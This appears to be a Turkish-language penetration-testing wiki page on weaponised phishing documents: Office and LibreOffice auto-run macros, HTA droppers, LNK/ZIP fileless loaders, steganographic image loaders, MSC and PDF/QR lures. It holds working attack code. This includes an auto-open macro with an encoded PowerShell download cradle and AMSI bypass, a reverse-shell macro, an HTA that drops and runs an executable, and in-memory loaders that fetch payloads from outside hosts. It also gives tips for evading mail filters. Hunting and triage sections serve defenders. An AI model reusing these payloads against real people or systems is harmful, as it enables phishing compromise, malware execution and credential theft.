# Phishing Dosyaları ve Belgeleri

{{#include ../../banners/hacktricks-training.md}}

## Office Belgeleri

Microsoft Word, bir dosyayı açmadan önce dosya verilerini doğrular. Veri doğrulama, OfficeOpenXML standardına göre veri yapısının tanımlanması şeklinde gerçekleştirilir. Veri yapısının tanımlanması sırasında herhangi bir hata oluşursa analiz edilen dosya açılmaz.

Genellikle macro içeren Word dosyalarında `.docm` uzantısı kullanılır. Ancak dosya uzantısını değiştirerek dosyayı yeniden adlandırmak ve macro çalıştırma özelliğini korumak mümkündür.\
Örneğin, RTF dosyaları tasarımları gereği macro desteklemez; ancak DOCM uzantısı RTF olarak değiştirilen bir dosya Microsoft Word tarafından işlenir ve macro çalıştırabilir.\
Aynı iç yapılar ve mekanizmalar Microsoft Office Suite'teki tüm yazılımlar için geçerlidir (Excel, PowerPoint vb.).

Bazı Office programlarının hangi uzantıları çalıştıracağını kontrol etmek için aşağıdaki komutu kullanabilirsiniz:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX dosyaları, makro içeren uzak bir şablona (File –Options –Add-ins –Manage: Templates –Go) başvurarak makroları da “çalıştırabilir”.

### Harici Görsel Yükleme

Şuraya gidin: _Ekle --> Hızlı Parçalar --> Alan_\
_**Kategoriler**: Bağlantılar ve Başvurular, **Alan adları**: includePicture ve **Dosya adı veya URL**:_ http://<ip>/whatever

![Office Documents - Harici Görsel Yükleme: Şuraya gidin: Ekle -- Hızlı Parçalar -- Alan](<../../images/image (155).png>)

### Makro Backdoor

Belgeden rastgele kod çalıştırmak için makrolar kullanmak mümkündür.

#### Otomatik yükleme işlevleri

Ne kadar yaygınlarsa, AV tarafından algılanma olasılıkları da o kadar yüksektir.

- AutoOpen()
- Document_Open()

#### Makro Kod Örnekleri

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Metadata'yı manuel olarak kaldırma

**File > Info > Inspect Document > Inspect Document** bölümüne giderek Document Inspector'ı açın. **Inspect**'e, ardından **Document Properties and Personal Information**'ın yanındaki **Remove All**'a tıklayın.

#### Doc uzantısı

İşiniz bittiğinde **Save as type** açılır menüsünü seçin ve biçimi **`.docx`**'ten Word 97-2003 **`.doc`**'a değiştirin.\
Bunu yapın çünkü **`.docx` dosyalarına macro kaydedemezsiniz** ve macro etkin **`.docm`** uzantısının **kötü bir şöhreti** vardır (ör. küçük resim simgesinde büyük bir `!` bulunur ve bazı web/e-posta gateway'leri bu dosyaları tamamen engeller). Bu nedenle, **eski `.doc` uzantısı en iyi uzlaşmadır**.

#### Kötü amaçlı Macro oluşturucuları

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT otomatik çalıştırma macro'ları (Basic)

LibreOffice Writer belgelerine Basic macro'ları eklenebilir ve macro, **Open Document** olayına bağlanarak dosya açıldığında otomatik olarak çalıştırılabilir (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Basit bir reverse shell macro'su şöyle görünür:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Dizelerdeki çift tırnaklara (`""`) dikkat edin — LibreOffice Basic, bunları gerçek tırnakları kaçırmak için kullanır; bu nedenle `...==""")` ile biten payload'larda hem iç komut hem de Shell argümanı dengeli kalır.

Teslimat ipuçları:

- Dosyayı `.odt` olarak kaydedin ve makroyu belge olayına bağlayın; böylece dosya açılır açılmaz çalışır.
- `swaks` ile e-posta gönderirken `--attach @resume.odt` kullanın (`@` işareti gereklidir; ek olarak dosya adı dizgesini değil, dosyanın baytlarını gönderir). Bu, doğrulama yapmadan rastgele `RCPT TO` alıcılarını kabul eden SMTP sunucularını kötüye kullanırken kritik önem taşır.

## HTA Dosyaları

HTA, **HTML ile (VBScript ve JScript gibi) betik dillerini birleştiren** bir Windows programıdır. Kullanıcı arayüzünü oluşturur ve tarayıcının güvenlik modelindeki kısıtlamalara tabi olmadan, "tam güvenilir" bir uygulama olarak çalışır.

HTA, genellikle **Internet Explorer** ile birlikte **yüklenen** `mshta.exe` kullanılarak çalıştırılır; bu nedenle `mshta`, IE'ye **bağımlıdır**. IE kaldırılmışsa HTA'lar çalıştırılamaz.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## NTLM Kimlik Doğrulamayı Zorlama

**Uzaktan** NTLM kimlik doğrulamayı **zorlamanın** birkaç yolu vardır. Örneğin, kullanıcının erişeceği e-postalara veya HTML sayfalarına **görünmez görseller** ekleyebilirsiniz (HTTP MitM bile?). Ya da kurbanlara, **klasörü açmalarıyla** bir **kimlik doğrulamayı** **tetikleyecek** dosya **adreslerini** gönderebilirsiniz.

**Bu fikirleri ve daha fazlasını aşağıdaki sayfalarda inceleyin:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Yalnızca hash'i veya kimlik doğrulamayı çalmakla kalmayıp **NTLM relay saldırıları da gerçekleştirebileceğinizi** unutmayın:

- [**NTLM Relay saldırıları**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (sertifikalara NTLM relay)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loader'ları + ZIP İçine Gömülü Payload'lar (fileless zincir)

Son derece etkili kampanyalar, iki meşru aldatıcı belge (PDF/DOCX) ve kötü amaçlı bir .lnk içeren bir ZIP gönderir. Buradaki püf nokta, asıl PowerShell loader'ının ZIP'in ham baytlarında benzersiz bir işaretleyiciden sonra saklanması ve .lnk dosyasının bu payload'ı ayıklayıp tamamen bellekte çalıştırmasıdır.<sup>[[2]](#references)</sup>

.lnk PowerShell one-liner'ının uyguladığı tipik akış:

1) Orijinal ZIP'i yaygın konumlarda bulun: Desktop, Downloads, Documents, %TEMP%, %ProgramData% ve geçerli çalışma dizininin üst dizini.
2) ZIP baytlarını okuyun ve sabit kodlanmış bir işaretleyici bulun (ör. xFIQCV). İşaretleyiciden sonraki her şey gömülü PowerShell payload'ıdır.
3) ZIP'i %ProgramData%'ya kopyalayın, oraya çıkarın ve meşru görünmek için aldatıcı .docx dosyasını açın.
4) Geçerli işlem için AMSI'yi atlatın: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Sonraki aşamanın obfuscation'ını kaldırın (ör. tüm # karakterlerini silin) ve bellekte çalıştırın.

Gömülü aşamayı ayıklayıp çalıştırmak için örnek PowerShell iskeleti:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Notlar
- Teslimat aşamasında sık sık itibarlı PaaS alt alan adları (örn., *.herokuapp.com) kötüye kullanılır ve payload'lar koşula bağlanabilir (IP/UA'ya göre zararsız ZIP'ler sunulur).
- Sonraki aşama, disk üzerindeki izleri en aza indirmek için çoğunlukla base64/XOR shellcode'un şifresini çözer ve bunu Reflection.Emit + VirtualAlloc aracılığıyla çalıştırır.

Aynı zincirde kullanılan kalıcılık yöntemi
- Microsoft Web Browser denetiminin COM TypeLib hijacking yöntemiyle ele geçirilmesi; böylece IE/Explorer veya bu denetimi gömen herhangi bir uygulama payload'ı otomatik olarak yeniden başlatır.<sup>[[2]](#references)[[4]](#references)</sup> Ayrıntılara ve kullanıma hazır komutlara buradan bakın:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Avlanma/IOC'ler
- Arşiv verisinin sonuna eklenmiş ASCII işaretçi dizgesini (örn., xFIQCV) içeren ZIP dosyaları.
- ZIP dosyasını bulmak için üst/ kullanıcı klasörlerini tarayan ve bir yem belgeyi açan .lnk.
- [System.Management.Automation.AmsiUtils]::amsiInitFailed aracılığıyla AMSI'ye müdahale.
- Güvenilir PaaS alan adlarında barındırılan bağlantılarla sona eren, uzun süre devam eden iş yazışmaları.

## LNK önce yem belgeyi açan staging → scheduled-task kalıcılığı → güvenilir CPL side-loading

Tekrarlanan başka bir modelde, **belgeyi taklit eden bir `.lnk`**, arka planda gerçek zinciri hazırlarken hemen zararsız bir yem belge açar.<sup>[[3]](#references)</sup>

Gözlemlenen iş akışı:
1. Kısayol **PDF gibi görünür** ve gizlenmiş bir PowerShell downloader başlatmak için `conhost.exe` veya benzer bir proxy kullanır.
2. PowerShell, bariz belirteçleri (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) parçalara ayırır; böylece `iwr`, `gci`, `ren`, `cpi` veya `schtasks` arayan basit tespitler komutu gözden kaçırır.
3. Stager önce **yem belgeyi indirir**, kurbanın açması için görüntüler ve ardından arka planda kötü amaçlı dosyaları yeniden oluşturur.
4. Payload'lar **alakasız uzantılarla** yazılabilir, ardından dolgu karakterleri kaldırılarak yeniden adlandırılabilir; böylece belirgin `.exe` / `.cpl` dosyalarının ortaya çıkması geciktirilir.
5. Kalıcılık, kullanıcı tarafından yazılabilir bir konumdan güvenilir bir host ikilisi başlatan **dakika aralıklı bir scheduled task** ile sağlanır.

Bu modele ilişkin temel avlanma ipuçları:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Tanımaya değer bir staging düzeni:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` veya `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### İkinci aşama neden gizlidir?

Rapid7 vaka incelemesinde, zamanlanmış görev **`Fondue.exe`** dosyasını `C:\Users\Public\` konumundan tekrar tekrar başlatıyordu. **`APPWIZ.cpl`** dosyası yanına bırakıldığı ve **`RunFODW`** dışa aktarıldığı için, güvenilir Microsoft binary’si meşru sistem kopyası yerine saldırganın CPL dosyasını side-load ediyordu.

CPL daha sonra:
- `C:\Windows\Tasks\editor.dat` konumundaki bir **AES-256-CBC** blob’unu okur.
- Blob’un şifresini **Windows CNG / `bcrypt.dll`** üzerinden çözer.
- Çalıştırılabilir bellek ayırır ve şifresi çözülmüş shellcode’u kopyalar.
- Shellcode işaretçisini **`EnumUILanguagesW`** için callback olarak vererek dolaylı biçimde çalıştırır.

Son adım ayrıca araştırılmaya değer: malware çoğu zaman doğrudan `((void(*)())buf)()` atlaması yapmak yerine, yürütmeyi devretmek için meşru bir callback alan WinAPI’yi kötüye kullanır.

Bu kampanyadaki şifresi çözülmüş payload, son PE’yi tamamen belleğe eşleyen ve yürütmeyi devretmeden önce mevcut işlemde **AMSI/WLDP/ETW** yamalayan **Donut** shellcode’uydu. Side-loading ve bellekte kalan post-processing hakkında daha fazla bilgi için:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Pratik araştırma ipuçları:
- Görünür bir decoy belgesiyle devam eden `.lnk` dosyasının `powershell.exe` veya `conhost.exe` başlatması.
- **`C:\Users\Public\`** konumuna kısa süreli indirmeler yapılması ve ardından anlamsız uzantılardan hemen yeniden adlandırma.
- **Kullanıcının yazabildiği dizinlerden** çalıştırılan, `GoogleErrorReport` gibi sıradan adlı zamanlanmış görevler.
- Güvenilir binary’lerin aynı sistem dışı dizindeki **`.cpl` / `.dll`** dosyalarını yüklemesi.
- **`C:\Windows\Tasks\`** altına yazılan ve ardından side-load edilmiş modül tarafından okunan Base64 metin blob’ları.

## Görsellerde steganografiyle sınırlandırılmış payload’lar (PowerShell stager)

Güncel loader zincirleri, Base64 PowerShell stager’ını çözüp çalıştıran, gizlenmiş JavaScript/VBS dosyaları dağıtıyor. Bu stager bir görsel (çoğunlukla GIF) indiriyor. Görsel, benzersiz başlangıç/bitiş işaretçileri arasında düz metin olarak gizlenmiş, Base64 kodlu bir .NET DLL içeriyor. Script bu ayırıcıları arıyor (gerçek saldırılarda görülen örnekler: «<<sudo_png>> … <<sudo_odt>>>»), aradaki metni çıkarıyor, baytlara dönüştürmek için Base64 kodunu çözüyor, assembly’yi belleğe yüklüyor ve bilinen bir giriş metodunu C2 URL’siyle çağırıyor.<sup>[[5]](#references)</sup>

İş akışı
- Aşama 1: Arşivlenmiş JS/VBS dropper → gömülü Base64’ü çözer → `-nop -w hidden -ep bypass` seçenekleriyle PowerShell stager’ı başlatır.
- Aşama 2: PowerShell stager → görseli indirir, işaretçilerle sınırlandırılmış Base64 verisini çıkarır, .NET DLL’yi belleğe yükler ve metodunu (ör. VAI) C2 URL’si ve seçeneklerle çağırır.
- Aşama 3: Loader son payload’ı alır ve genellikle process hollowing yoluyla güvenilir bir binary’ye (çoğunlukla MSBuild.exe) enjekte eder.<sup>[[7]](#references)[[8]](#references)</sup> Process hollowing ve güvenilir yardımcı program proxy yürütmesi hakkında daha fazla bilgi için:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Bir görselden DLL çıkarıp bellekte bir .NET metodunu çağıran PowerShell örneği:

<details>
<summary>PowerShell stego payload çıkarıcısı ve loader’ı</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Notlar
- Bu, ATT&CK T1027.003'tür (steganography/marker-hiding).<sup>[[6]](#references)</sup> İşaretçiler kampanyalara göre değişir.
- Assembly yüklenmeden önce genellikle AMSI/ETW bypass ve string deobfuscation uygulanır.
- Avcılık: İndirilen görselleri bilinen ayırıcılar için tarayın; görsellere erişip hemen Base64 blob'larını decode eden PowerShell işlemlerini belirleyin.

Ayrıca stego araçlarına ve carving tekniklerine bakın:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell hazırlama aşaması

Sık karşılaşılan bir ilk aşama, bir arşivin içinde teslim edilen küçük ve yoğun biçimde obfuscate edilmiş bir `.js` veya `.vbs` dosyasıdır. Tek amacı, gömülü bir Base64 dizgesini decode etmek ve HTTPS üzerinden sonraki aşamayı başlatmak için PowerShell'i `-nop -w hidden -ep bypass` ile çalıştırmaktır.<sup>[[5]](#references)</sup>

İskelet mantık (soyut):
- Kendi dosyasının içeriğini oku
- Junk dizgeler arasındaki Base64 blob'unu bul
- ASCII PowerShell'e decode et
- `wscript.exe`/`cscript.exe` kullanarak `powershell.exe` çağırıp çalıştır

Avcılık ipuçları
- Komut satırında `-enc`/`FromBase64String` bulunan `powershell.exe` işlemlerini başlatan arşivlenmiş JS/VBS ekleri.
- Kullanıcı geçici dizinlerinden `powershell.exe -nop -w hidden` başlatan `wscript.exe` işlemleri.

## Çalıştırma kapsayıcıları olarak MSC belgeleri (GrimResource)

Microsoft Management Console dosyaları (`.msc`), normalde `mmc.exe` ile açılan XML konsol tanımlarıdır. **GrimResource**, eski bir XSS primitive'i içeren `apds.dll` kaynağına yapılan `StringTable` başvurusunu silah olarak kullanır; böylece bir kullanıcının hazırlanmış konsolu açması JavaScript'in `mmc.exe` içinde çalışmasına neden olur. Gözlemlenen örneklerde, alışılmış Office makrosu yolunu kullanmadan bir .NET payload'u örneklemek için `transformNode` tabanlı obfuscation, **DotNetToJScript** ile birlikte kullanılmıştır.<sup>[[9]](#references)</sup>

Statik triage için güvenilmeyen bir MSC dosyasını metin olarak ele alın ve **çift tıklamayın**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Yüksek sinyalli runtime göstergeleri arasında `mmc.exe` dosyasının CLR'ı veya script bileşenlerini yüklemesi, ağ bağlantıları oluşturması ya da `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` veya beklenmeyen bir yürütülebilir dosya başlatması yer alır. Bu format meşru olduğundan, tespitler her MSC dosyasını engellemek yerine **kaynak + şüpheli XML/script içeriği + `mmc.exe` davranışı** ilişkisini kurmalıdır.<sup>[[9]](#references)</sup>

## PDF/QR yönlendiricileri ve payload koşullandırması

Bir PDF'nin kullanışlı olması için exploit içermesi gerekmez. Yakın tarihli kampanyalarda, zararsız görünen bir belgeye **QR kodu veya sıradan bir bağlantı** yerleştiriliyor, tarayıcı oturumu e-posta denetimlerinden uzaklaştırılıyor ve hedef, alıcının adresine göre kişiselleştiriliyor. Microsoft, QR URL'lerinin alıcıya özel olduğu ve RaccoonO365 kimlik bilgisi toplama altyapısına yönlendirdiği 2025 tarihli PDF'leri belgeledi; paralel bir zincirde ise IP/ortam koşullandırması kullanılarak seçili ziyaretçilere bir JavaScript/MSI yolu, tarayıcılara veya izin verilmeyen istemcilere ise zararsız bir PDF sunuldu.<sup>[[10]](#references)</sup>

Hem PDF eylemlerini hem de oluşturulan QR kodlarını triyaj edin. QR kodu, çıkarılabilir bir görsel olarak saklanmak yerine vektör çizimleriyle oluşturulmuş olabilir; bu nedenle gömülü görselleri çıkarmanın yanı sıra her sayfayı rasterleştirin:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

İzole bir analiz sisteminden kimlik doğrulaması yapmadan çözümlenmiş hedefleri ve yönlendirmeleri inceleyin. Yararlı tehdit avlama özellikleri arasında gövdesi neredeyse boş, yalnızca QR kodu içeren PDF'ler; sorgu parametresine gömülü alıcı e-posta adresi; itibarlı hosting hizmetleri üzerinden birden çok yönlendirme; ve IP, coğrafi konum, çerezler, referrer veya user agent'a göre döndürülen farklı içerikler bulunur. Tek bir sandbox isteği yalnızca yem içeriği alabileceğinden, istekleri kontrollü profillerle karşılaştırın.<sup>[[10]](#references)</sup>

## NTLM hash'lerini çalmak için Windows dosyaları

NTLM creds çalınabilecek yerler hakkındaki sayfaya göz atın:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice makrosu → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign: ABD Şirketlerini Hedef Alan Gelişmiş Bir Phishing Saldırısı](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Dropping Elephant'ın tradecraft'ini Çin temalı bir loader zinciri üzerinden izleme](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [TypeLib'i Ele Geçirme – Yeni COM kalıcılık tekniği (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader, Çeşitli Infostealer'lar Dağıtıyor](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganografi (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Güvenilir Geliştirici Yardımcı Programları Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: İlk erişim ve kaçınma için Microsoft Management Console](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Tehdit aktörleri, tax temalı phishing kampanyaları dağıtmak için vergi döneminden yararlanıyor](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
